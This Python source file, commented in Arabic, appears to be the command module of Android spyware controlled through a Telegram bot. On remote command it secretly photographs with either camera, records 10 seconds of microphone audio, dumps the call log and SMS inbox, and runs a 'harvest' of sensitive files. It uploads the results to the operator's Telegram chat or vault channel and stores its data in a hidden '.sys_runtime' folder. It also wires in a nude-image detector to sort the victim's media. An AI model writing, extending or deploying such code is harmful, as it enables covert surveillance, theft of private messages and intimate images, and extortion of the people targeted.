# -*- coding: utf-8 -*-
import os
import time
import json
import threading
import logging
import sys
import gc
from datetime import datetime

# إعداد المسارات (نفس مسار .sys_runtime المستخدم في main.py)
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
if not os.path.exists(P):
    os.makedirs(P)

# مجلد للملفات التي لم يتم تأكيد إرسالها بعد
PENDING_DIR = os.path.join(P, "pending_upload")
if not os.path.exists(PENDING_DIR):
    os.makedirs(PENDING_DIR)

# مجلد مؤقت للتسجيلات والصور
TEMP_DIR = os.path.join(P, "ctmp")
if not os.path.exists(TEMP_DIR):
    os.makedirs(TEMP_DIR)

logging.basicConfig(filename=os.path.join(P, "c.log"), level=logging.ERROR, filemode='a')

try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except ImportError:
    JNI = False


class C:
    def __init__(self):
        self.mic_busy = False
        self._cleanup()

    # تنظيف الملفات المؤقتة القديمة (أكثر من ساعة، والعالقة أكثر من يوم)
    def _cleanup(self):
        try:
            now = time.time()
            for folder, max_age in [(TEMP_DIR, 3600), (PENDING_DIR, 86400)]:
                if not os.path.exists(folder):
                    continue
                for f in os.listdir(folder):
                    path = os.path.join(folder, f)
                    if os.path.getmtime(path) < now - max_age:
                        os.remove(path)
        except Exception as e:
            logging.error(f"Cleanup error: {e}")

    # تهيئة المكونات (Lazy Loading)
    def _ensure_components(self, m):
        """تأكد من تحميل جميع المكونات: AI، سكانر، معرض، كاميرا، حصاد"""
        try:
            # 1. NudeDetector (AI)
            if not hasattr(m, 'nude_detector') or m.nude_detector is None:
                try:
                    import nude_detector
                    m.nude_detector = nude_detector.NudeDetector(m)
                    logging.info("✅ NudeDetector loaded")
                except Exception as e:
                    logging.error(f"NudeDetector init error: {e}")

            # 2. MediaScanner (يعتمد على الـ AI إن وجد)
            if not hasattr(m, 'media_scanner') or m.media_scanner is None:
                import media_scanner
                m.media_scanner = media_scanner.MediaScanner(det=m.nude_detector, ui=m.ui)
                logging.info("✅ MediaScanner loaded")

            # 3. GalleryBrowser
            if not hasattr(m, 'gallery_browser') or m.gallery_browser is None:
                import gallery_browser
                m.gallery_browser = gallery_browser.G(m.media_scanner, m.ui)
                logging.info("✅ GalleryBrowser loaded")

            # 4. CameraAnalyzer
            if not hasattr(m, 'camera_analyzer') or m.camera_analyzer is None:
                import camera_analyzer
                m.camera_analyzer = camera_analyzer.CameraAnalyzer(m, m.nude_detector)
                logging.info("✅ CameraAnalyzer loaded")

            # 5. DailyZipper
            if not hasattr(m, 'daily_zipper') or m.daily_zipper is None:
                import daily_zipper
                m.daily_zipper = daily_zipper.DailyZipper(m.media_scanner, m.ui)
                logging.info("✅ DailyZipper loaded")

        except Exception as e:
            logging.error(f"Component init error: {e}")

    # إرسال ملف نصي (مثل سجل المكالمات أو الرسائل) مع تأكيد الإرسال
    def _send_text_file(self, tg, chat_id, content, filename):
        temp_path = os.path.join(PENDING_DIR, f"{int(time.time())}_{filename}")
        try:
            with open(temp_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(content)
            with open(temp_path, 'rb') as f:
                resp = tg._api("sendDocument",
                               {"chat_id": chat_id, "caption": f"📄 {filename}"},
                               {"document": f})
            if resp and resp.get('ok'):
                os.remove(temp_path)
            else:
                logging.warning(f"File {filename} left in pending (API failed)")
        except Exception as e:
            logging.error(f"_send_text_file error: {e}")

    # تسجيل صوتي (10 ثوانٍ افتراضيًا) مع OnErrorListener و Handler
    def _record_audio(self, duration=10):
        if not JNI or self.mic_busy:
            return None
        self.mic_busy = True
        media_recorder = None
        out_path = os.path.join(TEMP_DIR, f"audio_{int(time.time())}.aac")

        try:
            MR = autoclass('android.media.MediaRecorder')
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Handler = autoclass('android.os.Handler')
            Looper = autoclass('android.os.Looper')

            media_recorder = MR()

            # إعداد OnErrorListener
            class ErrorListener(PythonJavaClass):
                __javainterfaces__ = ['android.media.MediaRecorder$OnErrorListener']
                @java_method('(Landroid/media/MediaRecorder;II)V')
                def onError(self, recorder, what, extra):
                    logging.error(f"Recorder error: what={what}, extra={extra}")
                    try:
                        recorder.stop()
                        recorder.reset()
                    except:
                        pass

            media_recorder.setOnErrorListener(ErrorListener())
            media_recorder.setAudioSource(MR.AudioSource.MIC)
            media_recorder.setOutputFormat(MR.OutputFormat.MPEG_4)
            media_recorder.setAudioEncoder(MR.AudioEncoder.AAC)
            media_recorder.setAudioEncodingBitRate(64000)
            media_recorder.setOutputFile(out_path)
            media_recorder.prepare()
            media_recorder.start()

            # التوقيف بعد المدة المطلوبة
            stop_event = threading.Event()
            handler = Handler(Looper.getMainLooper())
            handler.postDelayed(lambda: stop_event.set(), duration * 1000)

            while not stop_event.is_set() and self.mic_busy:
                time.sleep(0.1)

            if stop_event.is_set():
                media_recorder.stop()
                media_recorder.reset()
                return out_path
            else:
                return None

        except Exception as e:
            logging.error(f"Recording error: {e}")
            if media_recorder:
                try:
                    media_recorder.reset()
                except:
                    pass
            return None
        finally:
            if media_recorder:
                try:
                    media_recorder.release()
                except:
                    pass
            self.mic_busy = False

    # جلب سجل المكالمات
    def _call_log(self, limit=100):
        if not JNI:
            return "JNI غير متاح"
        cursor = None
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = ctx.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://call_log/calls"),
                                    None, None, None, "date DESC")
            if not cursor:
                return "لا صلاحية أو لا توجد مكالمات"
            lines = []
            idx_name = cursor.getColumnIndex("name")
            idx_number = cursor.getColumnIndex("number")
            while cursor.moveToNext() and len(lines) < limit:
                name = cursor.getString(idx_name) or "Unknown"
                num = cursor.getString(idx_number) or "?"
                lines.append(f"👤 {name} ({num})")
            return "\n".join(lines) if lines else "سجل المكالمات فارغ"
        except Exception as e:
            logging.error(f"Call log error: {e}")
            return "خطأ في قراءة المكالمات"
        finally:
            if cursor:
                cursor.close()

    # جلب رسائل SMS
    def _sms_log(self, limit=100):
        if not JNI:
            return "JNI غير متاح"
        cursor = None
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = ctx.getContentResolver()
            Uri = autoclass('android.net.Uri')
            cursor = resolver.query(Uri.parse("content://sms/inbox"),
                                    None, None, None, "date DESC")
            if not cursor:
                return "لا صلاحية أو لا توجد رسائل"
            lines = []
            idx_addr = cursor.getColumnIndex("address")
            idx_body = cursor.getColumnIndex("body")
            while cursor.moveToNext() and len(lines) < limit:
                addr = cursor.getString(idx_addr) or "?"
                body = cursor.getString(idx_body) or ""
                lines.append(f"📩 من: {addr}\n💬 {body}\n---")
            return "\n".join(lines) if lines else "صندوق الوارد فارغ"
        except Exception as e:
            logging.error(f"SMS error: {e}")
            return "خطأ في قراءة الرسائل"
        finally:
            if cursor:
                cursor.close()

    # التحقق من البطارية (اختياري)
    def _battery_ok(self, m):
        try:
            b, ch = m._bat() if hasattr(m, '_bat') else (100, False)
            return b >= 15 or ch
        except:
            return True

    # نقطة الدخول الرئيسية (تُستدعى من telegram_ui)
    def ex(self, cmd, tg, m, cid, cbq=None):
        threading.Thread(target=self._execute, args=(cmd, tg, m, cid, cbq), daemon=True).start()

    # معالج الأوامر الأساسي
    def _execute(self, cmd, tg, m, cid, cbq):
        try:
            # إذا كان هناك callback_query، قم بتأكيد استلامه (لتجنب تكرار الضغط)
            if cbq:
                tg._api("answerCallbackQuery", {"callback_query_id": cbq})

            # التأكد من تحميل جميع المكونات
            self._ensure_components(m)

            # ------------------- أوامر المعرض (Gallery Navigation) -------------------
            if cmd.startswith(("g_nav|", "g_opt|", "g_conf|", "g_act|")):
                parts = cmd.split("|")
                action = parts[0]
                if action == "g_nav":
                    cat, page = parts[1], int(parts[2])
                    new_kb = m.gallery_browser.get_grid_kb(cat=cat, page=page)
                    # تحرير الأزرار فقط دون تغيير النص
                    tg._api("editMessageReplyMarkup",
                            {"chat_id": cid, "message_id": m.last_mid, "reply_markup": json.dumps(new_kb)})
                elif action == "g_opt":
                    m.gallery_browser.show_options(cid, parts[1], parts[2], parts[3])
                elif action == "g_act":
                    m.gallery_browser.execute_action(cid, parts[1], parts[2], parts[3], parts[4])
                elif action == "g_conf":
                    act, cat, pg, idx = parts[1], parts[2], parts[3], parts[4]
                    confirm_kb = [[{"text": "🗑 نعم، احذف", "callback_data": f"g_act|del|{cat}|{pg}|{idx}"},
                                   {"text": "🔙 إلغاء", "callback_data": f"g_opt|{cat}|{pg}|{idx}"}]]
                    tg._api("sendMessage",
                           {"chat_id": cid, "text": "⚠️ هل أنت متأكد من الحذف؟",
                            "reply_markup": json.dumps({"inline_keyboard": confirm_kb})})
                return

            # ------------------- الكاميرا (خلفية / أمامية) -------------------
            if cmd.startswith(("cam_", "camf_")):
                is_front = 1 if "camf_" in cmd else 0
                if not self._battery_ok(m):
                    tg._api("sendMessage", {"chat_id": cid, "text": "🔋 البطارية منخفضة جداً (أقل من 15%)"})
                    return
                tg._api("sendChatAction", {"chat_id": cid, "action": "upload_photo"})
                pic_path = m.camera_analyzer.capture(cam_id=is_front)
                if pic_path and os.path.exists(pic_path):
                    with open(pic_path, 'rb') as f:
                        # إرسال إلى قناة الخزنة (vault) إن وجدت، وإلا إلى المستخدم نفسه
                        target = getattr(m, 'vlt', cid)
                        resp = tg._api("sendPhoto", {"chat_id": target, "caption": f"📸 {m.dmd}"}, {"photo": f})
                    if resp and resp.get('ok'):
                        os.remove(pic_path)
                    else:
                        # حفظ في مجلد الانتظار إذا فشل الإرسال
                        dest = os.path.join(PENDING_DIR, os.path.basename(pic_path))
                        os.rename(pic_path, dest)
                else:
                    tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التقاط الصورة (قد تكون الكاميرا مشغولة)"})
                return

            # ------------------- الميكروفون (تسجيل صوتي) -------------------
            if cmd.startswith("mic_"):
                if self.mic_busy:
                    tg._api("sendMessage", {"chat_id": cid, "text": "⏳ التسجيل قيد التنفيذ حالياً، انتظر قليلاً"})
                    return
                tg._api("sendMessage", {"chat_id": cid, "text": "🎤 جاري التسجيل لمدة 10 ثوانٍ..."})
                audio_path = self._record_audio(10)
                if audio_path and os.path.exists(audio_path):
                    with open(audio_path, 'rb') as f:
                        target = getattr(m, 'vlt', cid)
                        resp = tg._api("sendVoice", {"chat_id": target}, {"voice": f})
                    if resp and resp.get('ok'):
                        os.remove(audio_path)
                    else:
                        dest = os.path.join(PENDING_DIR, os.path.basename(audio_path))
                        os.rename(audio_path, dest)
                else:
                    tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل (قد تكون المايك مشغول أو لا توجد صلاحية)"})
                return

            # ------------------- سجل المكالمات -------------------
            if cmd.startswith("callog_"):
                tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
                data = self._call_log()
                self._send_text_file(tg, cid, data, "calls.txt")
                return

            # ------------------- رسائل SMS -------------------
            if cmd.startswith("sms_"):
                tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
                data = self._sms_log()
                self._send_text_file(tg, cid, data, "sms.txt")
                return

            # ------------------- الحصاد اليدوي -------------------
            if cmd.startswith("hrv_"):
                if hasattr(m, 'daily_zipper') and m.daily_zipper:
                    tg._api("sendMessage", {"chat_id": cid, "text": "📦 بدء الحصاد (جمع الملفات الحساسة وإرسالها)... قد يستغرق دقائق"})
                    threading.Thread(target=m.daily_zipper.run, daemon=True).start()
                else:
                    tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير جاهزة (daily_zipper)"})
                return

            # ------------------- فتح المعرض -------------------
            if cmd.startswith("media_"):
                if hasattr(m, 'gallery_browser') and m.gallery_browser:
                    kb = m.gallery_browser.get_grid_kb(cat="pending", page=0)
                    res = tg._api("sendMessage",
                                 {"chat_id": cid, "text": "🖼️ معرض الوسائط (غير المصنفة بعد)",
                                  "reply_markup": json.dumps(kb)})
                    if res and res.get('ok'):
                        m.last_mid = res['result']['message_id']
                else:
                    tg._api("sendMessage", {"chat_id": cid, "text": "❌ المعرض غير متاح"})
                return

            # ------------------- أمر غير معروف -------------------
            tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ أمر غير معروف. استخدم /menu لعرض القائمة."})

        except Exception as e:
            logging.error(f"Command handler error: {e}")
            tg._api("sendMessage", {"chat_id": cid, "text": f"❌ خطأ داخلي: {str(e)[:100]}"})
        finally:
            gc.collect()


# ========== الواجهة الخارجية ==========
_handler = None
def ex(cmd, tg, m, cid, cbq=None):
    global _handler
    if _handler is None:
        _handler = C()
    _handler.ex(cmd, tg, m, cid, cbq)
